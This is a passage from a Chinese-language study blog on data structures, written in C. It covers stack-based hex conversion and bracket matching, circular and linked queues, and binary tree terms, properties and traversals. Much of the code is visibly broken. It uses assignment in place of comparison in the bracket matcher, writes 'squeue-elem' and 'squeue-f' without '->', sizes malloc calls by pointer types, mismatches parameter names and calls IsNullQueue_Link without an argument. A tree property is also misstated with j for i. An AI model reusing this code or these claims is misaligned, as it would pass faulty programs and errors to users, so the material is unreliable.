class="string">&#x27;D&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">14</span>:temp = <span class="string">&#x27;E&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">15</span>:temp = <span class="string">&#x27;F&#x27;</span>;<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Push_link(ps,temp);</span><br><span class="line">        n/=<span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;结果为:&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(!IsNullStack_Link(ps))</span><br><span class="line">    &#123;</span><br><span class="line">        temp = Top_link(ps);</span><br><span class="line">        <span class="keyword">if</span>(temp&lt;<span class="number">10</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,temp);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,temp);</span><br><span class="line">        Pop_link(ps);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="栈实现：括号匹配"><a href="#栈实现：括号匹配" class="headerlink" title="栈实现：括号匹配"></a>栈实现：括号匹配</h3><ul><li><p>算法思路</p><ul><li><p>所有的左括号都进栈，设置标志位<code>flag</code>为1</p></li><li><p>遇到右括号开始匹配，首先检查栈是否为空</p><ul><li><p>如果栈空，表示匹配失败，右括号多了</p></li><li><p>如果栈不空</p><ul><li><p>如果匹配到左括号，左括号出栈</p></li><li><p>如果不匹配，<code>flag</code>设为0</p></li></ul></li></ul></li><li><p>检验结束时</p><ul><li><strong>栈不为空或者<code>flag</code>为0</strong>，则表示匹配不成功</li><li><strong>栈空</strong>，则表示匹配成功</li></ul></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BracketMatch</span><span class="params">(LinkStack top)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">   <span class="type">char</span> ch,temp;</span><br><span class="line">    Push_link(top,<span class="string">&#x27;#&#x27;</span>);<span class="comment">//栈底放#，结束标志位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入要判断表达式，用#表示结束：\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line">    <span class="keyword">while</span>(ch!=<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch = <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Push_link(top,ch);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ch = <span class="string">&#x27;)&#x27;</span>&amp;&amp;!IsNullStack_Link(top))</span><br><span class="line">            &#123;</span><br><span class="line">                temp = Top_link(top);</span><br><span class="line">                <span class="keyword">if</span>(temp == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Pop_link(top);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        scanf_s(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag||Top_link(top)!=<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;yes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><ul><li>队列限定在一端进行插入、一端进行删除，插入端称<strong>队尾</strong>，删除端称<strong>队头</strong></li><li><strong>先进先出</strong></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201210203612.png"></p><blockquote><p>队列会存在假溢出的情况，即当前队列并不满，但是不能入队</p><p>原因：被删除的元素的空间没有再被使用</p><p>解决：循环队列</p></blockquote><h3 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201211050316.png"></p><h4 id="循环队列类型定义"><a href="#循环队列类型定义" class="headerlink" title="循环队列类型定义"></a>循环队列类型定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> Max;<span class="comment">//队列空间最大值</span></span><br><span class="line">    <span class="type">int</span> f,r;<span class="comment">//队头指针和队尾指针</span></span><br><span class="line">    DataType *elem;<span class="comment">//队列元素空间</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> *<span class="title">SeqQueue</span>;</span></span><br></pre></td></tr></table></figure><h4 id="创建空队列"><a href="#创建空队列" class="headerlink" title="创建空队列"></a>创建空队列</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SeqQueue <span class="title function_">SetNullQueue_Seq</span><span class="params">(<span class="type">int</span> m)</span></span><br><span class="line">&#123;</span><br><span class="line">    SeqQueue squeue;</span><br><span class="line">    squeue = (SeqQueue)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SeqQueue));</span><br><span class="line">    <span class="keyword">if</span>(squeue == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        squeue-elem = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DataType)*m);</span><br><span class="line">        squeue-&gt;Max = m;</span><br><span class="line">        squeue-&gt;f = <span class="number">0</span>;</span><br><span class="line">        squeue-&gt;r = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> squeue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="判断队空"><a href="#判断队空" class="headerlink" title="判断队空"></a>判断队空</h4><ul><li>检查队头和队尾指针是否相等，如果相等为空队列，返回1，否则返回0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullQueue_seq</span><span class="params">(SeqQueue Squeue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (squeue-&gt;f == squeue-&gt;r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h4><ul><li>若队列没满，在队尾添加元素，修改队尾指针</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">EnQueue_seq</span><span class="params">(Sequeue Squeue, DataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((squeue-&gt;r+<span class="number">1</span>)%squeue-&gt;Max == squeue-&gt;f)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队列已满\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        squeue-&gt;elem[squeue-&gt;r] = x;<span class="comment">//插入元素x</span></span><br><span class="line">        squeue-&gt;r = (squeue-&gt;r+<span class="number">1</span>) % (squeue-&gt;Max);<span class="comment">//队尾指针++</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h4><ul><li>首先判断队列是否为空，非空则删除队头元素，修改队头指针</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeQueue_seq</span><span class="params">(SeqQueue squeue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullQueue_seq(squeue))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队列是空的\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        squeue-f = (squeue-&gt;f+<span class="number">1</span>)%(squeue-&gt;Max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取队头元素"><a href="#取队头元素" class="headerlink" title="取队头元素"></a>取队头元素</h4><ul><li>首先判断队列是否为空，非空则返回队头元素</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DataType <span class="title function_">FrontQueue_seq</span><span class="params">(SeqQueue squeue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(squeue-&gt;f == squeue-&gt;r)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队列是空的\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> squeue-&gt;elem[squeue-&gt;f];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链队列"><a href="#链队列" class="headerlink" title="链队列"></a>链队列</h3><h4 id="链队列类型定义"><a href="#链队列类型定义" class="headerlink" title="链队列类型定义"></a>链队列类型定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">link</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PNode f;<span class="comment">//队头指针</span></span><br><span class="line">   PNode r;<span class="comment">//队尾指针</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span> *<span class="title">LinkQueue</span>;</span></span><br></pre></td></tr></table></figure><h4 id="创建空队列-1"><a href="#创建空队列-1" class="headerlink" title="创建空队列"></a>创建空队列</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkQueue <span class="title function_">SetNullQueue_Link</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkQueue lqueue;</span><br><span class="line">    lqueue = (LinkQueue)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkQueue));</span><br><span class="line">    <span class="keyword">if</span>(lqueue!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        lqueue-&gt;f = <span class="literal">NULL</span>;</span><br><span class="line">        lqueue-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc失败\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> lqueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="判断队空-1"><a href="#判断队空-1" class="headerlink" title="判断队空"></a>判断队空</h4><ul><li>检查队头指针，如果为空，返回1，否则返回0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullQueue_Link</span><span class="params">(LinkQueue lqueue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(lqueue-&gt;f == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="入队-1"><a href="#入队-1" class="headerlink" title="入队"></a>入队</h4><ul><li>申请结点，数据域指针域赋值<ul><li>如果是第一个结点，特殊处理，队头和队尾指针都指向该结点</li><li>如果不是第一个结点，则在队尾插入，修改队尾指针</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">EnQueue_link</span><span class="params">(LinkQueue lqueue,DataType x)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    p = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(PNode));</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc失败\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;data = x;</span><br><span class="line">        p-&gt;link =<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(lqueue-&gt;f == lqueue-&gt;r)</span><br><span class="line">        &#123;</span><br><span class="line">            lqueue-&gt;f = p;</span><br><span class="line">            lqueue-&gt;r = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            lqueue-&gt;r-&gt;link = p;</span><br><span class="line">            lqueue-&gt;r = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="出队-1"><a href="#出队-1" class="headerlink" title="出队"></a>出队</h4><ul><li>首先判断队列是否为空，非空则修改队头指针并释放队头结点空间</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DeQueue_link</span><span class="params">(LinkQueue lqueue)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;</span><br><span class="line">    <span class="keyword">if</span>(IsNullQueue_Link)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队列为空\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = lqueue-&gt;f;</span><br><span class="line">        lqueue-&gt;f = lqueue-&gt;f-&gt;link;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取队头元素-1"><a href="#取队头元素-1" class="headerlink" title="取队头元素"></a>取队头元素</h4><ul><li>首先判断队列是否为空，非空返回队头元素</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DataType <span class="title function_">FrontQueue_link</span><span class="params">(LinkQueue lqueue)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsNullQueue_Link)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队列为空\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> lqueue-&gt;f-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h3><blockquote><p>同时具备栈和队列的性质的数据结构，既可以在头部和尾部插入和删除元素的数据结构</p><blockquote><p>具体的东西以后学了再补上来</p></blockquote></blockquote><h1 id="第四章-树与二叉树"><a href="#第四章-树与二叉树" class="headerlink" title="第四章 树与二叉树"></a>第四章 树与二叉树</h1><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ul><li>二叉树是结点的有限集合</li><li>这个集合可以是空集，也可以是一个称为<code>根</code>和两棵不相交的分别为<code>左子树和右子树</code>的二叉树组成</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212201323.png"></p><h2 id="二叉树基本术语"><a href="#二叉树基本术语" class="headerlink" title="二叉树基本术语"></a>二叉树基本术语</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212201718.png"></p><ul><li><p><code>祖先</code>：最早的根节点，A就是整个二叉树的祖先</p><p><code>父结点</code>：A就是B和C的父结点，B是D的父结点</p><p><code>子结点</code>：B和C就是A的子结点</p></li><li><p><code>兄弟结点</code>：处在同一父母结点的结点，互称兄弟结点，B和C就是兄弟结点</p></li><li><p><code>结点的度</code>：结点的孩子的个数，A的度为2</p></li><li><p><code>树叶和分支结点</code>：度为0的叫<code>树叶</code>，其他都叫<code>分支结点</code></p></li><li><p><code>路径</code>：连接的边</p><p><code>路径长度</code>：层数</p></li><li><p><code>结点的层数（约定根结点为0）</code>：B、C的层数就是1，D、E和F的层数就是2</p></li><li><p><code>二叉树的高度</code>：二叉树当中最大的层数，就是高度，G的层数是3，高度为3</p></li><li><p><code>B</code>：分支</p></li></ul><h2 id="特殊的二叉树"><a href="#特殊的二叉树" class="headerlink" title="特殊的二叉树"></a>特殊的二叉树</h2><h3 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212202559.png"></p><h3 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212202649.png"></p><h3 id="扩充二叉树"><a href="#扩充二叉树" class="headerlink" title="扩充二叉树"></a>扩充二叉树</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212202818.png"></p><h2 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h2><ul><li><p>在非空二叉树的第&#x3D;&#x3D;i&#x3D;&#x3D;层上至多有&#x3D;&#x3D;2^j^&#x3D;&#x3D;个结点(&#x3D;&#x3D;i&gt;&#x3D;0&#x3D;&#x3D;)</p><p>归纳证明：&#x3D;&#x3D;i &#x3D; 0&#x3D;&#x3D;，&#x3D;&#x3D;结点数&#x3D;1&#x3D;2^0^&#x3D;&#x3D;，假设对于&#x3D;&#x3D;j(0&lt;&#x3D;j&lt;&#x3D;i)&#x3D;&#x3D;，结点数至多有&#x3D;&#x3D;2^j^&#x3D;&#x3D;，对于&#x3D;&#x3D;i&#x3D;j+1&#x3D;&#x3D;，结点数至多有&#x3D;&#x3D;2*2^j^&#x3D;2^j+1^&#x3D;&#x3D;</p></li><li><p>深度为 &#x3D;&#x3D;k&#x3D;&#x3D;的二叉树至多有&#x3D;&#x3D;2^k+1^-1&#x3D;&#x3D;个结点(&#x3D;&#x3D;k&gt;&#x3D;0&#x3D;&#x3D;)</p></li><li><p>对任何一棵非空二叉树T，如果叶结点个数为&#x3D;&#x3D;n<del>0</del>&#x3D;&#x3D;，度为2的结点数位&#x3D;&#x3D;n<del>2</del>&#x3D;&#x3D;，则&#x3D;&#x3D;n<del>0</del>&#x3D;n<del>2</del>+1&#x3D;&#x3D;</p></li></ul><h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><ul><li>沿某条搜索路径访问二叉树，对二叉树中的每个结点<code>访问一次且仅访问一次</code></li><li>遍历一棵非空二叉树<ul><li>访问根节点 D </li><li>遍历左子树 L</li><li>遍历右子树 R</li></ul></li></ul><h3 id="二叉树的深度遍历"><a href="#二叉树的深度遍历" class="headerlink" title="二叉树的深度遍历"></a>二叉树的深度遍历</h3><h4 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h4><ul><li>按照<code>D-&gt;L-&gt;R</code>的顺序访问结点<ol><li>访问根节点</li><li><code>先根次序</code>遍历<code>D</code>的左子树</li><li><code>先根次序</code>遍历<code>D</code>的右子树</li></ol></li><li>伪代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)<span class="comment">//结束递归的条件</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Visit(root(bt));<span class="comment">//访问结点的数据域</span></span><br><span class="line">    PreOrder(leftchild(bt));<span class="comment">//先根递归遍历t的左子树</span></span><br><span class="line">    PreOrder(rightchild(bt));<span class="comment">//先根递归遍历t的右子树</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201213220117.png"></p><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><ul><li>按照<code>L-&gt;D-&gt;R</code>的顺序访问结点<ol><li><code>对称次序</code>遍历左子树</li><li>访问根结点</li><li><code>对称次序</code>遍历右子树</li></ol></li><li>伪代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BinTree bt)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)<span class="comment">//结束递归的条件</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    InOrder(leftchild(bt));<span class="comment">//对称递归遍历t的左子树</span></span><br><span class="line">    Visit(root(bt));<span class="comment">//访问结点的数据域</span></span><br><span class="line">    InOrder(rightchild(bt));<span class="comment">//对称递归遍历t的右子树</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><ul><li>按照<code>L-&gt;R-&gt;D</code>的顺序访问结点<ol><li><code>后根次序</code>遍历左子树</li><li><code>后根次序</code>遍历右子树</li><li>访问根节点</li></ol></li><li>伪代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BinTree bt)</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)<span class="comment">//结束递归的条件</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    PostOrder(leftchild(bt));<span class="comment">//后根递归遍历t的左子树</span></span><br><span class="line">    PostOrder(rightchild(bt));<span class="comment">//后根递归遍历t的右子树</span></span><br><span class="line">    Visit(root(bt));<span class="comment">//访问结点的数据域</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>举例：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201212211638.png"></p><h3 id="二叉树的广度遍历（层次遍历）"><a href="#二叉树的广度遍历（层次遍历）" class="headerlink" title="二叉树的广度遍历（层次遍历）"></a>二叉树的广度遍历（层次遍历）</h3><ul><li>从二叉树的第一层开始，&#x3D;&#x3D;从上到下逐层遍历，在同一层中，从左到右逐个遍历&#x3D;&#x3D;</li><li>伪代码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BinTree(bt))</span></span><br><span class="line">&#123;</span><br><span class="line">    初始化队列 q;</span><br><span class="line">    <span class="keyword">if</span>(bt==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">while</span>(队列不空)</span><br><span class="line">    &#123;</span><br><span class="line">        出队元素 p;</span><br><span class="line">        visit(p);<span class="comment">//访问队头结点的数据域</span></span><br><span class="line">        <span class="keyword">if</span>(leftchild(p)!=<span class="literal">NULL</span>)<span class="comment">//队头左孩子不为空则让左孩子入队</span></span><br><span class="line">            leftchild(p) 入队q;</span><br><span class="line">        <span class="keyword">if</span>(rightchild(p)!=<span class="literal">NULL</span>)<span 